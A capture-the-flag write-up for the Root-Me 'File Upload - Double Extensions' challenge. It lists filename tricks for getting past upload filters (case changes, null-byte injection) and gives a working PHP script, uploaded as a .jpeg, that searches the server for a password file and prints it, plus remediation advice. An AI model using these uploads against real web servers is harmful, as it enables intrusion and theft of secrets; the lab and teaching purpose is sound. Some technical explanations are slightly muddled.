## Root-Me.org Challenge Write-Up: Web Server - File Upload - Double Extensions
`https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions`

This comprehensive write-up analyzes the "File Upload - Double Extensions" challenge in the Web Server category on Root-Me.org, delving into the vulnerability, exploitation techniques, debugging methods, and crucial security lessons for developers.

### Challenge Description

The challenge presents a straightforward yet impactful objective: "Your goal is to hack this photo gallery by uploading PHP code. Retrieve the validation password in the file .passwd at the root of the application." 

This scenario reflects a prevalent web application vulnerability: exploiting insecure file uploads to gain unauthorized access to sensitive data.

### Understanding the Vulnerability: File Upload Validation Bypass

File uploads are indispensable for many web applications but introduce a significant attack surface if not properly secured. This challenge revolves around exploiting **inadequate validation of uploaded files.**

The challenge's name, "Double Extensions," provides a strong clue. Many applications rely on a simplistic check of the file extension (e.g., .jpg, .png) to determine the file type. Attackers exploit this weakness by using filenames with multiple extensions, such as `malicious_script.php.jpg`. If the server only validates the last extension, it might process the file as an image (.jpg) while remaining oblivious to the embedded PHP code (.php).

#### Bypassing Stringent Filters: The Art of Double Extensions

While a simple `file.php.jpg` often suffices, more robust applications might employ additional checks.  Here are some techniques to bypass more stringent filters:

* **Case Sensitivity:** Some filters might be case-sensitive, so variations like `file.phP.jpg` or `file.php.JpG` could slip through.
* **Special Characters:**  Inserting special characters (allowed within filenames) like underscores (`file_php.jpg`) or hyphens (`file-php.jpg`) before the final extension might confuse certain filters.
* **Null Byte Injection:** In specific cases, injecting a null byte (`%00`) into the filename (`file.php%00.jpg`) might prematurely truncate it during validation, allowing the PHP extension to take precedence. 

### Exploitation Methodology

#### 1. Crafting the Malicious Upload

Our first step involves creating a PHP file, which we'll name `exploit.php`, containing code to traverse the web server's directory structure and retrieve the contents of the `.passwd` file. Here's the PHP code:

```php
<?php
// Define a function to recursively traverse directories
function read_passwd($dir) {
  // Check if the directory is readable before proceeding
  if (!is_readable($dir)) {
    return false; // Skip if directory is not readable
  }

  // List files and directories in the current directory
  $files = scandir($dir);

  // Iterate through the files and directories
  foreach($files as $file) {
    // Skip '.' and '..' (current and parent directory)
    if ($file == '.' || $file == '..') {
      continue;
    }

    // Construct the full path to the file/directory
    $path = $dir . '/' . $file;

    // Check if it's a file named '.passwd'
    if (is_file($path) && $file == '.passwd') {
      // Read and return the contents of the .passwd file
      return file_get_contents($path);
    }

    // If it's a directory, recursively call this function
    if (is_dir($path)) {
      $result = read_passwd($path);
      if ($result !== false) {
        return $result;
      }
    }
  }

  // If .passwd not found in current directory or its subdirectories
  return false;
}

// Start traversing from four levels up (relative to the uploaded file)
$passwd_content = read_passwd(dirname(dirname(dirname(dirname(__FILE__)))));

// Check if the .passwd file was found
if ($passwd_content !== false) {
  echo "Contents of .passwd:\n";
  echo $passwd_content;
} else {
  echo "Error: .passwd file not found.";
}
?>
```

The `read_passwd()` function remains consistent. The crucial element lies in pinpointing the starting directory for traversal. The challenge states that the `.passwd` file is located at the "root of the application." By analyzing the provided upload path (`./galerie/upload/1c06365d15e9a4d85637720d426ac404/exploit.php.jpeg`), we observe four levels of directories, indicating the need to traverse up four levels.  The code `dirname(dirname(dirname(dirname(__FILE__))))` accomplishes this, ensuring the script starts its search from the intended directory.

#### 2. Uploading the File

We rename our `exploit.php` file to `exploit.php.jpeg` and attempt to upload it. Our goal is to trick the server's validation into categorizing it as a harmless JPEG image. 

#### 3. Executing the PHP Code

If the upload is successful, we access the provided URL of the uploaded file.  A successful bypass results in the server executing our PHP code, despite the seemingly innocuous JPEG extension.

#### 4. Debugging: Traversing the File System 

If our initial traversal depth is incorrect, we need a way to visually inspect the directory structure.  Modify your `exploit.php.jpeg` file to include the following code:

```php
<?php
// ... (Previous code remains the same)

// Echo the current working directory 
echo "Current Directory: " . getcwd() . "<br>";

// To go one level up:
$oneLevelUp = dirname(__FILE__);
echo "One Level Up: " . $oneLevelUp . "<br>";

// To go two levels up:
$twoLevelsUp = dirname(dirname(__FILE__));
echo "Two Levels Up: " . $twoLevelsUp . "<br>";

// ... and so on, adding more 'dirname()' calls to go higher ...

// (Remove or comment out the call to read_passwd() for debugging) 
?>
```

This modified script reveals the absolute path of each directory level, starting with the current directory of the script. By analyzing the output, we can precisely determine how many levels we need to traverse to reach the root of the application.

#### 5. Retrieving the Password File

After confirming the correct traversal depth, we revert to our original `exploit.php` code (the one that reads the `.passwd` file), rename it back to `exploit.php.jpeg`, re-upload, and access its URL.  With the adjusted traversal, the script should now locate and display the contents of the `.passwd` file, marking the challenge as solved.

### Security Implications and Remediation

This seemingly simple challenge exposes a critical vulnerability with potentially dire consequences. A successful exploit could allow an attacker to upload and execute arbitrary code on the server, potentially leading to data breaches, defacement, or complete system compromise.

To mitigate this risk, developers must prioritize robust file upload security:

* **Whitelist Validation:** Only allow uploads of files with specific, pre-approved extensions.  Avoid relying solely on blacklists, as they are often easily bypassed.
* **MIME Type Verification:**  Validate the file's MIME type (Content-Type header) to ensure it matches the expected file type, not just the extension.
* **Content Inspection:**  Implement content-based validation techniques to examine the actual contents of the uploaded file, looking for signatures or patterns indicative of malicious code.
* **Unique Filenames:**  Generate random and unique filenames for uploaded files to prevent attacks that rely on predictable filenames.
* **Secure Storage:** Store uploaded files outside the webroot directory, preventing direct access via a web browser.

By incorporating these best practices, developers can significantly reduce the risk of file upload vulnerabilities and protect their applications and sensitive data from malicious actors. 
